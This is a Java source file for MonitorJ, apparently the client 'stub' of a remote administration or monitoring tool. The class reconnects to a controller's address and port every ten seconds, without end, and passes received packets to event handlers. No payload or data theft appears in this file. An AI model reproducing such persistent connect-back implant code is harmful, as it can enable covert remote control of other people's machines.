package me.jershdervis.monitorj.stub.client;


import cn.a114.utils.ClientPrinter;
import cn.a114.utils.SoutUtils;
import me.jershdervis.monitorj.stub.MonitorJStub;

import java.io.*;
import java.net.*;

/**
 * Created by Josh on 18/06/2015.
 */
public class BaseClient implements Runnable {


    private final long RECONNECT_DELAY = 10000L; //重连等待毫秒
    private final String address; //控制端地址
    private final int port; // 控制端端口


    private Socket serverSocketConnection;

    private DataOutputStream dataOutputStream;
    private DataInputStream dataInputStream;

    private String exc = "";


    public BaseClient(String address, int port) {
        this.address = address;
        this.port = port;
    }

    public Socket getServerSocketConnection() {
        return this.serverSocketConnection;
    }

    public DataOutputStream getDataOutputStream() {
        return this.dataOutputStream;
    }

    public DataInputStream getDataInputStream() {
        return this.dataInputStream;
    }

    @Override
    public void run() {
        //noinspection InfiniteLoopStatement
        while (true) {

            /// Establish a connection to the server
            /// If it fails, it will wait for RECONNECT_DELAY mile(s) and try again.

        trying:
            try {
                this.serverSocketConnection = this.connect(this.address, this.port);
                this.dataOutputStream = new DataOutputStream(this.serverSocketConnection.getOutputStream());
                this.dataInputStream = new DataInputStream(this.serverSocketConnection.getInputStream());
                ClientPrinter.out("Connection Success!");
            } catch (IOException e) {
                exc = e.toString();
                if (exc.toLowerCase().contains("refused")) {
                    ClientPrinter.out(new SoutUtils().yellowBGStr(exc));
                }
            }

            /// Connection has been established successfully
            /// Call the Connect Event

            MonitorJStub.getInstance().EVENT_CONNECT.call(this);

            /**
             * While the current socket isn't closed
             */

            try {
                while (!this.serverSocketConnection.isClosed()) {
                    int packet;
                    try {
                        while ((packet = this.dataInputStream.readByte()) < 0)
                            MonitorJStub.getInstance().EVENT_RECEIVE_PACKET.call(packet, this);
                    } catch (IOException e) {
                        exc = e.toString();
                        if (exc.toLowerCase().contains("closed")) {
                            ClientPrinter.out(new SoutUtils().yellowBGStr(exc));
                        }
                    }

                    /**
                     * Calls the disconnect event as well as starting the reconnection process.
                     */
                    MonitorJStub.getInstance().EVENT_DISCONNECT.call(this);
                    this.delayReconnection();
                    break;
                }
            } catch (NullPointerException npe) {
                npe.printStackTrace();
            }
            this.delayReconnection();
        }
    }


    /**
     * Resolves the compiled stubs ip.
     *
     * @param address
     * @return
     * @throws MalformedURLException
     * @throws UnknownHostException
     */
    private String addressToIp(String address) throws IOException {
        boolean containsProtocol = address.toLowerCase().contains("http://");

        String externalIp = containsProtocol ? InetAddress.getByName(new URL(this.address).getHost()).getHostAddress() : InetAddress.getByName(new URL("http://" + this.address).getHost()).getHostAddress();

        String myExternalIp = new BufferedReader(new InputStreamReader(new URL("http://checkip.amazonaws.com/").openStream())).readLine();
        if (externalIp.equals(myExternalIp)) return "127.0.0.1";
        return externalIp;
    }

    /**
     * Used to delay client reconnection
     */
    private void delayReconnection() {
        try {
            Thread.sleep(this.RECONNECT_DELAY);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    /**
     * Create Socket connection. Returns the socket that was created.
     *
     * @param address Socket address
     * @param port    Socket port
     * @return new Socket(address, port)
     * @throws IOException
     */
    private Socket connect(String address, int port) throws IOException {
        address = this.addressToIp(address);
        ClientPrinter.out("Attempting to connect to " + address + ":" + port);
        return new Socket(address, port);
    }

}
